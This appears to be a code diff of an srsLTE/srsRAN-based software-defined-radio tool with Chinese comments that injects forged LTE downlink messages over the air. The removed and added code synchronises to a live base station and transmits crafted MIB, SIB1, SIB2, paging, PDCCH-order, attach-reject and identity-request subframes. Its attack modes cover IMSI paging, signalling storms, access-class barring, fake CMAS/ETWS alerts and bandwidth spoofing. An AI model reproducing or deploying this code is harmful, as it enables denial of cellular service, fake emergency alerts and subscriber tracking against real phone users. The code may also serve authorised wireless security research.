-        pdsch_cfg.nof_layers = multiplex_nof_layers;
-        nof_tb = multiplex_nof_layers;
-        break;
-    default:
-        ERROR("Transmission mode not implemented.");
-        exit(-1);
-    }
-
-    bzero(&ra_dl, sizeof(srslte_ra_dl_dci_t));
-    ra_dl.harq_process = 0;
-    ra_dl.mcs_idx = mcs_idx;
-    ra_dl.ndi = 0;
-    ra_dl.rv_idx = rvidx[0];
-    ra_dl.alloc_type = SRSLTE_RA_ALLOC_TYPE0;
-    ra_dl.type0_alloc.rbg_bitmask = prbset_to_bitmask();
-    ra_dl.tb_en[0] = 1;
-
-    if (nof_tb > 1)
-    {
-        ra_dl.mcs_idx_1 = mcs_idx;
-        ra_dl.ndi_1 = 0;
-        ra_dl.rv_idx_1 = rvidx[1];
-        ra_dl.tb_en[1] = 1;
-    }
-
-    srslte_ra_pdsch_fprint(stdout, &ra_dl, cell.nof_prb);
-    srslte_ra_dl_grant_t dummy_grant;
-    srslte_ra_nbits_t dummy_nbits[SRSLTE_MAX_CODEWORDS];
-    srslte_ra_dl_dci_to_grant(&ra_dl, cell.nof_prb, UE_CRNTI, &dummy_grant);
-    srslte_ra_dl_grant_to_nbits(&dummy_grant, cfi, cell, 0, dummy_nbits);
-    srslte_ra_dl_grant_fprint(stdout, &dummy_grant);
-    dummy_grant.sf_type = SRSLTE_SF_NORM;
-    if (pdsch_cfg.mimo_type != SRSLTE_MIMO_TYPE_SINGLE_ANTENNA)
-    {
-        printf("\nTransmission mode key table:\n");
-        printf("   Mode   |   1TB   | 2TB |\n");
-        printf("----------+---------+-----+\n");
-        printf("Diversity |    x    |     |\n");
-        printf("      CDD |         |  z  |\n");
-        printf("Multiplex | q,w,e,r | a,s |\n");
-        printf("\n");
-        printf("Type new MCS index (0-28) or mode key and press Enter: ");
-    }
-    else
-    {
-        printf("Type new MCS index (0-28) and press Enter: ");
-    }
-    fflush(stdout);
-
-    return 0;
-}
-
-/* Read new MCS from stdin */
-int update_control()
-{
-    char input[128];
-
-    fd_set set;
-    FD_ZERO(&set);
-    FD_SET(0, &set);
-
-    struct timeval to;
-    to.tv_sec = 0;
-    to.tv_usec = 0;
-
-    int n = select(1, &set, NULL, NULL, &to);
-    if (n == 1)
-    {
-        // stdin ready
-        if (fgets(input, sizeof(input), stdin))
-        {
-            if (input[0] == 27)
-            {
-                switch (input[2])
-                {
-                case RIGHT_KEY:
-                    if (prbset_orig + prbset_num < (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb)))
-                        prbset_orig++;
-                    break;
-                case LEFT_KEY:
-                    if (prbset_orig > 0)
-                        prbset_orig--;
-                    break;
-                case UP_KEY:
-                    if (prbset_num < (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb)))
-                        prbset_num++;
-                    break;
-                case DOWN_KEY:
-                    last_prbset_num = prbset_num;
-                    if (prbset_num > 0)
-                        prbset_num--;
-                    break;
+            case 'I':
+                rf_dev = argv[optind-1];
+                break;
+            case 'i':
+                ext_file_name = optarg;
+                printf("file name: %s\n", ext_file_name);
+                break;
+            case 'a':
+                rf_args = optarg;
+                break;
+            case 'g':
+                rf_gain = strtof(optarg, NULL);
+                break;
+            case 'l':
+                rf_amp = strtof(optarg, NULL);
+                break;
+            case 'f':
+                rf_freq = strtof(optarg, NULL);
+                fprintf(stderr, "[WARN] -f is deprecated, frequency may be ignored.\n");
+                break;
+            case 'o':
+                output_file_name = optarg;
+                break;
+            case 'm':
+                mcs_idx = (uint32_t)strtol(optarg, NULL, 10);
+                break;
+            case 'u':
+                net_port = (int)strtol(optarg, NULL, 10);
+                break;
+            case 'n':
+                nof_frames = (int)strtol(optarg, NULL, 10);
+                break;
+            case 'p':
+                cell.nof_prb = (uint32_t)strtol(optarg, NULL, 10);
+                break;
+            case 'c':
+                cell.id = (int)strtol(optarg, NULL, 10);
+                break;
+            case 'x':
+                transmission_mode = (srsran_tm_t)(strtol(optarg, NULL, 10) - 1);
+                break;
+            case 'b':
+                multiplex_pmi = (uint32_t)strtol(optarg, NULL, 10);
+                break;
+            case 'w':
+                multiplex_nof_layers = (uint32_t)strtol(optarg, NULL, 10);
+                break;
+            case 'M':
+                mbsfn_area_id = (int)strtol(optarg, NULL, 10);
+                break;
+            case 'v':
+                increase_srsran_verbose_level();
+                break;
+            case 's':
+                output_file_snr = strtof(optarg, NULL);
+                break;
+            case 'B':
+                mbsfn_sf_mask = (uint8_t)strtol(optarg, NULL, 10);
+                break;
+            case 'q':
+                enable_256qam ^= true;
+                break;
+            case 'Q':
+                use_standard_lte_rate ^= true;
+                break;
+            case 'E':
+                cell.cp = SRSRAN_CP_EXT;
+                break;
+            case 'C':
+                cfr_args.mode = optarg;
+                break;
+            case 'T':
+                cfr_args.manual_thres = strtof(optarg, NULL);
+                break;
+            case 'S':
+                cfr_args.strength = strtof(optarg, NULL);
+                break;
+            case 'P':
+                cfr_args.auto_target_papr = strtof(optarg, NULL);
+                break;
+            case 'e':
+                cfr_args.ema_alpha = strtof(optarg, NULL);
+                break;
+            case 't': {
+              attack_mode = optarg;
+                if (strcmp(attack_mode, "paging_imsi") == 0) {
+                    paging_msg = true;
+                    paging_file_name = "paging_imsi_sf9.fc32";
                 }
-            }
-            else
-            {
-                switch (input[0])
-                {
-                case 'q':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
-                    multiplex_pmi = 0;
-                    multiplex_nof_layers = 1;
-                    break;
-                case 'w':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
-                    multiplex_pmi = 1;
-                    multiplex_nof_layers = 1;
-                    break;
-                case 'e':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
-                    multiplex_pmi = 2;
-                    multiplex_nof_layers = 1;
-                    break;
-                case 'r':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
-                    multiplex_pmi = 3;
-                    multiplex_nof_layers = 1;
-                    break;
-                case 'a':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
-                    multiplex_pmi = 0;
-                    multiplex_nof_layers = 2;
-                    break;
-                case 's':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
-                    multiplex_pmi = 1;
-                    multiplex_nof_layers = 2;
-                    break;
-                case 'z':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_CDD;
-                    break;
-                case 'x':
-                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_TX_DIVERSITY;
-                    break;
-                default:
-                    last_mcs_idx = mcs_idx;
-                    mcs_idx = atoi(input);
+                else if (strcmp(attack_mode, "sib1_tac") == 0) {
+                    sib1_msg = true;
+                    paging_msg = true;
+                    paging_file_name = "paging_sysinfmod_sf9.fc32";
+                    sib1_file_name = "sib1_tac_sf5.fc32";
                 }
-            }
-            bzero(input, sizeof(input));
-            if (update_radl())
-            {
-                printf("Trying with last known MCS index\n");
-                mcs_idx = last_mcs_idx;
-                prbset_num = last_prbset_num;
-                return update_radl();
-            }
-        }
-        return 0;
-    }
-    else if (n < 0)
-    {
-        // error
-        perror("select");
-        return -1;
-    }
-    else
-    {
-        return 0;
-    }
-}
-
-/** Function run in a separate thread to receive UDP data */
-void *net_thread_fnc(void *arg)
-{
-    int n;
-    int rpm = 0, wpm = 0;
-
-    do
-    {
-        n = srslte_netsource_read(&net_source, &data2[rpm], DATA_BUFF_SZ - rpm);
-        if (n > 0)
-        {
-            // FIXME: I assume that both transport blocks have same size in case of 2 tb are active
-            int nbytes = 1 + (pdsch_cfg.grant.mcs[0].tbs + pdsch_cfg.grant.mcs[1].tbs - 1) / 8;
-            rpm += n;
-            INFO("received %d bytes. rpm=%d/%d\n", n, rpm, nbytes);
-            wpm = 0;
-            while (rpm >= nbytes)
-            {
-                // wait for packet to be transmitted
-                sem_wait(&net_sem);
-                memcpy(data[0], &data2[wpm], nbytes / (size_t)2);
-                memcpy(data[1], &data2[wpm], nbytes / (size_t)2);
-                INFO("Sent %d/%d bytes ready\n", nbytes, rpm);
-                rpm -= nbytes;
-                wpm += nbytes;
-                net_packet_ready = true;
-            }
-            if (wpm > 0)
-            {
-                INFO("%d bytes left in buffer for next packet\n", rpm);
-                memcpy(data2, &data2[wpm], rpm * sizeof(uint8_t));
-            }
-        }
-        else if (n == 0)
-        {
-            rpm = 0;
-        }
-        else
-        {
-            fprintf(stderr, "Error receiving from network\n");
-            exit(-1);
-        }
-    } while (n >= 0);
-    return NULL;
-}
-
-/*
-// 连续发送
-void *tx_thread_func() {
-  srslte_timestamp_t last_time;
-  srslte_timestamp_t future_time;
-  bool start_of_burst = true;
-  bool end_of_burst = true;
-  bool first = true;
-  float time_offset = 2;
-  usleep(3000000);
-  memcpy(&last_time, &last_stamp, sizeof(srslte_timestamp_t));
-  while (last_time.full_secs == last_stamp.full_secs && last_time.frac_secs == last_stamp.frac_secs) {
-    usleep(10);
-  }
-  //printf("[1][get_last_time] %.f: %f us\n",difftime(last_time.full_secs, (time_t) 0),(last_time.frac_secs*1e6));
-  future_time.full_secs = last_time.full_secs;
-  future_time.frac_secs = last_time.frac_secs + time_offset;
-
-  if (future_time.frac_secs >= 1.0) {
-    future_time.full_secs++;
-    future_time.frac_secs--;
-  }
-
-  printf("[future_time] %.f: %f s\n",difftime(future_time.full_secs, (time_t) 0),future_time.frac_secs);
-  //printf("[current_time] %.f: %f s\n",difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);
-  int ret = srslte_rf_send_timed_multi(&rf, (void**) output_buffer2, sf_n_samples*10, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
-  if (ret != sf_n_samples*10) {
-    printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples*10!!!!!\n");
-    exit(-1);
-  }
-  first = false;
-  bool start_of_burst = true;
-  while(!go_exit) {
-    int ret = srslte_rf_send_multi(&rf, (void**) output_buffer2, sf_n_samples*10, true, start_of_burst, false);
-    if (ret != sf_n_samples*10) {
-      printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples*10!!!!!\n");
-      exit(-1);
-    }
-    start_of_burst = false;
-  }
-  return NULL;
-}
-*/
-
-/*
-// 原来的发射函数-定时发送
-void *tx_thread_func()
-{
-    // printf("[TX] TX线程开始执行\n");
-    // 绑定线程到第4个CPU核心上，确保时间精度，避免操作系统把线程在不同核心间切换导致时间不准
-    unsigned long mask = 8; // 1 2 4 8 (对应核心1,2,3,4)
-
-    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0)
-    {
-        printf("\033[1;31m[x] CPU 核心绑定失败\033[0m");
-    }
-
-    // 变量初始化
-    srslte_timestamp_t future_time;    // 未来时间戳（用于精确时间发射）
-    bool start_of_burst = true;        // 帧开始标志
-    bool end_of_burst = true;          // 帧结束标志
-    bool first = true;                 // 首次运行标志
-    bool paging_stop = false;          // 寻呼停止标志
-    float time_offset = 0.01 - 0.0001; // 时间偏移量（10ms - 0.1ms）
-
-    // 同步相关变量
-    int cur_sf_idx;                     // 当前子帧索引
-    int cur_sfn;                        // 当前系统帧号
-    int next_sfn = -1;                  // 下一系统帧号
-    int cur_rx_ret;                     // 接收线程时间同步返回值 0表示同步成功
-    srslte_timestamp_t cur_time;        // 当前时间戳
-    float estimated_cfo, estimated_sfo; // 估计的CFO和SFO
-
-    while (!go_exit) // 主循环，直到退出标志被设置
-    {
-        pthread_mutex_lock(&mutex); // 获取互斥锁，等待RX线程更新数据
-        while (updated == false)    // 等待接收线程更新 updated 标志
-        {
-            pthread_cond_wait(&cond, &mutex); // 等待条件变量信号并释放互斥锁
-        }
-        updated = false; // 重置更新标志
-
-        // 获取接收函数修改后的全局变量
-        cur_sf_idx = sf_idx;
-        cur_sfn = sfn;
-        cur_rx_ret = rx_ret; // 接收线程时间同步成功
-        memcpy(&cur_time, &last_stamp, sizeof(srslte_timestamp_t));
-        // pthread_mutex_unlock(&mutex); // 释放互斥锁
-
-        // 首次运行时的频率偏移估计和补偿
-        // if (cur_rx_ret != 0 && cur_sfn >= 0 && first == true)
-        if (cur_rx_ret == 0 && cur_sfn >= 0 && first == true)
-        {
-            int samp_rate = srslte_sampling_freq_hz(cell.nof_prb); // 根据PRB计算采样频率
-            estimated_cfo = srslte_ue_sync_get_cfo(&ue_sync);      // 获取载波频率偏移
-            estimated_sfo = srslte_ue_sync_get_sfo(&ue_sync);      // 获取采样频率偏移
-            first = false;
-            printf("[+] Frequency offset estimated..........CFO: %f SFO: %f\n", estimated_cfo, estimated_sfo);
-            pthread_mutex_unlock(&mutex); // 释放互斥锁
-            continue;
-        }
-
-        // 关键逻辑：在特定子帧（0,5,9）发送预录数据
-        // if (cur_rx_ret == 0 && cur_sfn >= 0 && (cur_sf_idx == 1 || cur_sf_idx == 5 || cur_sf_idx == 9))
-        if (cur_rx_ret == 0 && cur_sfn >= 0)
-        {
-            // 计算未来发射时间（当前时间 + 偏移）
-            memcpy(&future_time, &cur_time, sizeof(srslte_timestamp_t));
-            future_time.frac_secs += time_offset;
-
-            // 应用时间校准偏移（不同设备需要不同的偏移量）
-            future_time.frac_secs -= (66.0 / 30720000.0); // 30.72 MHz采样率的偏移量
-
-            // 时间戳规范化（处理秒进位）
-            if (future_time.frac_secs >= 1.0)
-            {
-                future_time.full_secs += (int)future_time.frac_secs;
-                future_time.frac_secs -= (int)future_time.frac_secs;
-            }
-
-            next_sfn = (cur_sfn + 1) % 1024; // 系统帧号循环（0-1023）
-            pthread_mutex_unlock(&mutex);    // 释放互斥锁
-            int ret = -1;                    // 实际成功发送的采样点数量
-
-            if (attack_mode == 0) // IMSI-Paging
-            {
-                // 子帧9处理：寻呼信息发送
-                if (cur_sf_idx == 9 && !paging_stop)
-                {
-                    printf("[Subframe %d] Paging Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
-                    // 发送output_buffer3中的数据（子帧9的寻呼数据）
-                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer3,
-                                                     sf_n_samples * 1.2,
-                                                     future_time.full_secs, future_time.frac_secs,
-                                                     true, start_of_burst, end_of_burst);
-                    if (ret != sf_n_samples * 1.2)
-                    {
-                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
-                        exit(-1);
-                    }
+                else if (strcmp(attack_mode, "sib2_acbarring") == 0) {
+                    sib2_msg = true;
+                    paging_msg = true;
+                    paging_file_name = "paging_sysinfmod_sf9.fc32";
+                    sib2_file_name = "sib2_acbarring_sf1.fc32";
                 }
-            }
-            else if (attack_mode == 1) // CMAS
-            {
-                // 子帧5处理：SIB1发送
-                if (cur_sf_idx == 5 && !paging_stop)
-                {
-                    printf("[Subframe %d] SIB1 Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
-                    // 发送output_buffer2中的数据（子帧5的SIB数据）
-                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer2,
-                                                     sf_n_samples * 1.2, // 1.2倍采样点（包含保护间隔）
-                                                     future_time.full_secs, future_time.frac_secs,
-                                                     true, start_of_burst, end_of_burst);
-
-                    if (ret != sf_n_samples * 1.2)
-                    {
-                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
-                        exit(-1);
-                    }
+                else if (strcmp(attack_mode, "pdcch_order") == 0) {
+                    po_msg = true;
+                    pdcchorder_file_name = "pdcch_order_sf8.fc32";
                 }
-            }
-            else if (attack_mode == 2) // SIG_STORM
-            {
-                // 子帧5处理：SIB1发送
-                if (cur_sf_idx == 5 && !paging_stop)
-                {
-                    printf("[Subframe %d] SIB1 Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
-                    // 发送output_buffer2中的数据（子帧5的SIB数据）
-                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer2,
-                                                     sf_n_samples * 1.2, // 1.2倍采样点（包含保护间隔）
-                                                     future_time.full_secs, future_time.frac_secs,
-                                                     true, start_of_burst, end_of_burst);
-
-                    if (ret != sf_n_samples * 1.2)
-                    {
-                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
-                        exit(-1);
-                    }
+                else if (strcmp(attack_mode, "attach_reject") == 0) {
+                    ar_msg = true;
+                    attachreject_file_name = "attach_reject_sf8.fc32";
                 }
-                // 子帧9处理：寻呼信息发送
-                if (cur_sf_idx == 9 && !paging_stop)
-                {
-                    printf("[Subframe %d] Paging Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
-                    // 发送output_buffer3中的数据（子帧9的寻呼数据）
-                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer3,
-                                                     sf_n_samples * 1.2,
-                                                     future_time.full_secs, future_time.frac_secs,
-                                                     true, start_of_burst, end_of_burst);
-                    if (ret != sf_n_samples * 1.2)
-                    {
-                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
-                        exit(-1);
-                    }
-                }
-            }
-            else if (attack_mode == 3) // AC_Barring
-            {
-                // 子帧0处理：SIB12或SIB2发送
-                if (cur_sf_idx == 0)
-                {
-                    printf("[Subframe %d] SIB2 Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
-                    // 发送output_buffer4中的数据（子帧0的SIB数据）
-                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer4,
-                                                     sf_n_samples * 1.2,
-                                                     future_time.full_secs, future_time.frac_secs,
-                                                     true, start_of_burst, end_of_burst);
+                else if (strcmp(attack_mode, "identity_request") == 0) {
+                    ir_msg = true;
+                    identityrequest_file_name = "identity_request_sf8.fc32";
 
-                    if (ret != sf_n_samples * 1.2)
-                    {
-                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
-                        exit(-1);
-                    }
-                }
-            }
-            else if (attack_mode == 4)
-            {
-            }
-            else if (attack_mode == 5)
-            {
-            }
-            first = false;
-        }
-        else
-        {
-            pthread_mutex_unlock(&mutex); // 释放互斥锁
-        }
-    }
-    return NULL;
-}
-*/
-
-typedef int (*tx_handler_t)(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len);
-
-// IMSI_PAGING (mode 0): 仅在子帧9发送 output_buffer3
-int handler_paging_imsi(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    if (paging_stop)
-        return 0;
-    if (cur_sf_idx == 9)
-    {
-        *out_buf = output_buffer3[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    return 0;
-}
-
-int handler_paging_etws(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    if (paging_stop)
-        return 0;
-    if (cur_sf_idx == 9)
-    {
-        *out_buf = output_buffer3[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    return 0;
-}
-
-// SIG_STORM (mode 1): 子帧5发送 SIB1 (output_buffer2)，子帧9发送 paging (output_buffer3)
-int handler_sig_storm(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    if (paging_stop)
-        return 0;
-    if (cur_sf_idx == 5)
-    {
-        *out_buf = output_buffer2[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    else if (cur_sf_idx == 9)
-    {
-        *out_buf = output_buffer3[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    return 0;
-}
-
-
-// AC_BARRING (mode 2): 子帧0发送 SIB2(output_buffer4)，子帧9发送 paging(output_buffer3)
-int handler_ac_barring(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    if (cur_sf_idx == 1)
-    // if (cur_sf_idx == 0)
-    {
-        *out_buf = output_buffer4[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    else if (cur_sf_idx == 9)
-    {
-        *out_buf = output_buffer3[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    return 0;
-}
-
-// MIB-DLBW (mode 2): 子帧0发送 MIB(output_buffer4)，子帧9发送 paging(output_buffer3)
-int handler_mib_dlbw(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    if (cur_sf_idx == 0)
-    {
-        *out_buf = output_buffer4[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    else if (cur_sf_idx == 9)
-    {
-        *out_buf = output_buffer3[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    return 0;
-}
-
-// SCHED_BARRED (mode 3): 子帧5发送 SIB1 (output_buffer2)，子帧9发送 paging (output_buffer3)
-int handler_sib_mnc(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    if (paging_stop)
-        return 0;
-    if (cur_sf_idx == 5)
-    {
-        *out_buf = output_buffer2[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    else if (cur_sf_idx == 9)
-    {
-        *out_buf = output_buffer3[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    return 0;
-}
-
-// CMAS (mode 4)
-int handler_cmas(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    if (cur_sf_idx == 1) // 子帧0的SIB12
-    {
-        *out_buf = output_buffer4[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    else if (cur_sf_idx == 5) // 子帧5的SIB1
-    {
-        *out_buf = output_buffer2[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    else if (cur_sf_idx == 9) // 子帧9的Paging
-    {
-        *out_buf = output_buffer3[0];
-        *out_len = (int)(sf_n_samples * 1.2);
-        return 1;
-    }
-    return 0;
-}
-// 默认 handler（mode 未实现）
-int handler_null(int cur_sf_idx, bool paging_stop, cf_t **out_buf, int *out_len)
-{
-    (void)cur_sf_idx;
-    (void)paging_stop;
-    *out_buf = NULL;
-    *out_len = 0;
-    return 0;
-}
-
-#define MAX_ATTACK_MODES 8
-static tx_handler_t tx_handlers[MAX_ATTACK_MODES] = {
-    handler_paging_imsi,  // 0
-    handler_sig_storm,    // 1
-    handler_ac_barring,   // 2
-    handler_sib_mnc,      // 3
-    handler_mib_dlbw,     // 4
-    handler_cmas,         // 5
-    handler_paging_etws,  // 6
-    handler_null,         // 7
-    handler_null          // 8
-};
-
-// 优化后的发射函数
-void *tx_thread_func()
-{
-    unsigned long mask = 8; // 绑定到核心4（和你原来一致）
-    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0)
-    {
-        printf("\033[1;31m[x] CPU 核心绑定失败\033[0m\n");
-    }
-
-    srslte_timestamp_t future_time;
-    bool start_of_burst = true;
-    bool end_of_burst = true;
-    bool first = true;
-    bool paging_stop = false;
-    float time_offset = 0.01 - 0.0001; // 10ms - 0.1ms
-
-    int cur_sf_idx = -1;
-    int cur_sfn = -1;
-    int cur_rx_ret = -1;
-    srslte_timestamp_t cur_time;
-    float estimated_cfo = 0.0f, estimated_sfo = 0.0f;
-
-    while (!go_exit)
-    {
-        pthread_mutex_lock(&mutex);
-
-        while (updated == false && !go_exit)
-        {
-            pthread_cond_wait(&cond, &mutex);
-        }
-        if (go_exit)
-        {
-            pthread_mutex_unlock(&mutex);
-            break;
-        }
-
-        updated = false;
-
-        // 复制接收线程写入的全局状态（在临界区内复制）
-        cur_sf_idx = sf_idx;
-        cur_sfn = sfn;
-        cur_rx_ret = rx_ret;
-        memcpy(&cur_time, &last_stamp, sizeof(srslte_timestamp_t));
-
-        // 首次运行时的频偏估计
-        if (cur_rx_ret == 0 && cur_sfn >= 0 && first == true)
-        {
-            int samp_rate = srslte_sampling_freq_hz(cell.nof_prb);
-            estimated_cfo = srslte_ue_sync_get_cfo(&ue_sync);
-            estimated_sfo = srslte_ue_sync_get_sfo(&ue_sync);
-            first = false;
-            printf("[+] Frequency offset estimated..........CFO: %f SFO: %f\n", estimated_cfo, estimated_sfo);
-            pthread_mutex_unlock(&mutex);
-            continue;
-        }
-
-        // 只有在同步成功并且系统帧号大于等于0的时候才开始发送
-        if (!(cur_rx_ret == 0 && cur_sfn >= 0))
-        {
-            pthread_mutex_unlock(&mutex);
-            continue;
-        }
-
-        // 计算未来发射时间（复制 cur_time 后修改）
-        memcpy(&future_time, &cur_time, sizeof(srslte_timestamp_t));
-        future_time.frac_secs += time_offset;
-
-        future_time.frac_secs -= (66.0 / 30720000.0); // 设备校准偏移，需根据设备调整
-
-        // 处理秒位进位
-        if (future_time.frac_secs >= 1.0)
-        {
-            future_time.full_secs += (int)future_time.frac_secs;
-            future_time.frac_secs -= (int)future_time.frac_secs;
-        }
-
-        int next_sfn = (cur_sfn + 1) % 1024;
-        cf_t *to_send_buf = NULL;
-        int to_send_len = 0;
-        int handler_idx = attack_mode;
-        if (handler_idx < 0 || handler_idx >= MAX_ATTACK_MODES)
-        {
-            handler_idx = 0; // 防御性回退
-        }
-        tx_handler_t handler = tx_handlers[handler_idx];
-
-        // 根据攻击类型读取要发送的数据，如果读取成功就开始发送
-        int want_send = handler(cur_sf_idx, paging_stop, &to_send_buf, &to_send_len);
-
-        // 释放互斥锁（handler 只读取全局或外部 buffer 指针，不应持有 mutex 做发送）
-        pthread_mutex_unlock(&mutex); // 释放互斥锁
-
-        char *msg_type[10] = {
-            // 下标表示注入消息所在的子帧号
-            "MIB",    // 0
-            "SIB2",   // 1
-            "NULL",   // 2
-            "NULL",   // 3
-            "NULL",   // 4
-            "SIB1",   // 5
-            "NULL",   // 6
-            "NULL",   // 7
-            "NULL",   // 8
-            "Paging", // 9
-        };
-
-        if (want_send)
-        {
-            printf("[Subframe %d] %s Injected! next_sfn: %d future_time: %.f: %f s\n",
-                   cur_sf_idx, msg_type[cur_sf_idx], next_sfn,
-                   difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
-
-            // 发送构造好的恶意的消息
-            int ret = srslte_rf_send_timed_multi(&rf, (void **)&to_send_buf,
-                                                 to_send_len,
-                                                 future_time.full_secs, future_time.frac_secs,
-                                                 true, start_of_burst, end_of_burst);
-
-            if (ret != to_send_len)
-            {
-                printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not expected len (%d vs %d)!!!!!\n\033[0m", ret, to_send_len);
-                exit(-1);
-            }
-        }
-        first = false;
-        usleep(1);
-    }
-    return NULL;
-}
-
-// 接收线程函数
-void *rx_thread_func()
-{
-    // printf("[RX] RX线程开始执行\n");
-    // 绑定线程到第4个CPU核心上，确保时间精度，避免操作系统把线程在不同核心间切换导致时间不准
-    unsigned long mask = 8; // 1 2 4 8 (对应核心1,2,3,4)
-    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0)
-    {
-        printf("\033[1;31m[x] CPU 核心绑定失败\033[0m");
-    }
-    // uhd_set_thread_priority(0.4, false);
-    int n;
-    int ret;
-    int sfn_offset;
-    uint8_t bch_payload[SRSLTE_BCH_PAYLOAD_LEN];
-    bool acks[SRSLTE_MAX_CODEWORDS] = {false};
-    srslte_cell_t cell;
-    srslte_timestamp_t previous_time;
-    while (!go_exit)
-    {
-        pthread_mutex_lock(&mutex);
-        ret = srslte_ue_sync_zerocopy_multi(&ue_sync, sf_buffer_sync); // 实现UE与基站的子帧级时间同步
-        if (ret == 1)
-        {
-            rx_ret = 0;
-            srslte_ue_sync_get_last_timestamp(&ue_sync, &last_stamp);
-            sf_idx = srslte_ue_sync_get_sfidx(&ue_sync);
-            printf("\033[1;32m[Subframe %d] UE与基站的子帧同步成功(zerocopy_multi success)\n\033[0m", sf_idx);
-            if (srslte_ue_sync_get_sfidx(&ue_sync) == 0) // 如果当前是子帧0，就尝试解码MIB
-            {
-                n = srslte_ue_mib_decode(&ue_mib, bch_payload, NULL, &sfn_offset);
-                if (n < 0)
-                {
-                    printf("\033[1;33m[-] PBCH 解码过程出错\n\033[0m");
-                    // printf("\033[1;33m[-] Error decoding UE MIB\n\033[0m");
+                } else if (strcmp(attack_mode, "extend") == 0) {
+                  ext_msg = true;
+                } else {
+                    fprintf(stderr, "[ERROR] Unknown --type: %s\n", attack_mode);
+                    usage(argv[0]);
                     exit(-1);
                 }
-                else if (n == 0)
-                {
-                    sfn = -100;
-                    // fprintf(stderr, "MIB DECODING FAILED\n");
-                    printf("\033[1;33m[-] PBCH 中未找到 MIB, 需要更多数据\n\033[0m");
-                    // printf("\033[1;33m[-] MIB DECODING FAILED\n\033[0m");
-                }
-                else if (n == SRSLTE_UE_MIB_FOUND)
-                {
-                    printf("[Subframe 0] MIB Decoded Success\n");
-                    srslte_pbch_mib_unpack(bch_payload, &cell, &sfn);
-                    // srslte_cell_fprint(stdout, &cell, sfn);
-                    // printf("Decoded MIB. SFN: %d, offset: %d\n", sfn, sfn_offset);
-                    sfn = (sfn + sfn_offset) % 1024;
-                }
+                break;
             }
-            updated = true;
-            pthread_cond_signal(&cond);
